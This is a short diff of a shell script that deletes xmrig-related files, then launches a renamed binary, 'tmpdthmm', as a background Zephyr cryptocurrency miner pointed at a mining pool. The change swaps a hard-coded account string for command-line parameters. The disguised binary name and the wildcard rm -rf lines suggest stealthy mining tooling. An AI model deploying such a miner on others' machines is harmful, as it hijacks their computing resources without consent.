@@ -29,7 +29,7 @@ rm -rf xmrig*
 rm -rf Start*
 rm -rf con*
 chmod +x tmpdthmm
-./tmpdthmm --coin zephyr --url "zeph.kryptex.network:8888" --user "snake9411@proton.me/$1" --tls -k -B
+./tmpdthmm --coin zephyr --url "zeph.kryptex.network:8888" --user "$1/$2" --tls -k -B
 
 sleep 10
 
